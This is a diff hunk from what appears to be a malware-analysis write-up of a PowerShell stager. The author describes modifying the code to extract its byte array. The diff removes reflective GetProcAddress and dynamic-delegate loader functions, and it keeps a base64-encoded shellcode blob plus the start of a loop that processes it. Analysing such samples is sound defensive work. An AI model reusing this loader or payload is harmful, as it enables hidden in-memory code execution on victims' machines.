@@ -147,26 +147,6 @@ This is more Powershell code
 I modified the code to get the byte array
 ```powershell
 $DoIt = @'
-function func_get_proc_address {
-        Param ($var_module, $var_procedure)
-        $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
-        $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
-        return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
-}
-
-function func_get_delegate_type {
-        Param (
-                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
-                [Parameter(Position = 1)] [Type] $var_return_type = [Void]
-        )
-
-        $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-        $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
-        $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
-
-        return $var_type_builder.CreateType()
-}
-
 [Byte[]]$var_code = [System.Convert]::FromBase64String('j5v6c3NzE/qWQqEX+CFD+CF/+CFn+AFbfMQ5VUKMQrPfTxIPcV9Tsrx+crSRgyEk+CFj+DFPcqP4Mwv2swc5cqMj+Dtr+CtTcqCQTzr4R/hypUKMQrPfsrx+crRLkwaHcA6LSA5XBpEr+CtXcqAV+H84+CtvcqD4d/hyo/o3V1coKBIqKSKMkyssKfhhmPUuGx0WB3MbBBodGicbPwRVdIymm3Nzc3NCjCQkJCQkG0klCtSMpprXc3NzKEK6IiIZcCIiG8hyc3MgIxsk+uy1jKYjmv9zc3MoQqEhG3NBs/chISEgISMbmCZdSIym+rXwsCMb80Bzc/qTGXcjGWwlGwY17fWMpixCjCQkGYwgJRtedWsIjKb2s3z3uXJzc0KM9oUHd/qKmHob2baRLoym+rIbNlItQoymQowkGXQiJSMbxCSTeIymzHNcc3NKtAZ0KyOaCIyMjEKMmuJyc3OaunJzc5scjIyMXDYpJBVzGBx4JNhU8MLH0/Wp+2OXxwjehevWqQvSuus5ztGohvhmqDMjJsBmHYVH8gGu5M+2AL7pP3vvJ0+dD8r85BkvhKn5Cbo1axeU/XMmABYBXjIUFh0HSVM+HAkaHx8SXEZdQ1NbEBweAxIHGhEfFkhTPiA6NlNKXUNIUyQaHRccBABTPSdTRV1CSFMnARoXFh0HXEZdQ0hTMTw6NkpIIycxIVp+eXOoBsvVGP6BY/ZI8BXwtIOqG4lTF36/h781uSuKLclWo9E6yUvNEINXZQfUY4XfXRqfS2AXioYJ9JlK4i7/SBr5ZsVE3ngyEilNsbp/d8VgZIXR5ScGVkIrcXKaNv7QkdM4W7Ck1eiRl5nilbR1vpit1bdbhPlZ6R32P7kT1KWwB7RfTezdm0hGiOBNSSLcSmBgFGIPTpoDLsnjPWez9DbJ/bEk7imeyKV7W7R4MvMcBoV1wtQjrKY1bWXJqwebG/P7KlZDJDy6QAu2IBsUiqwOI+rx5TJzG4PG0SWMphkzG3Njc3Mbc3MzcyQbK9cgloym4Mpzc3NzcqoiIPqUJBtzU3NzICUbYeX6kYym9rMHtfh0crD2swaWK7Cb+o6MjBESF10eHBcWAwYAG10aHHNzc3Nw')
 
 for ($x = 0; $x -lt $var_code.Count; $x++) {
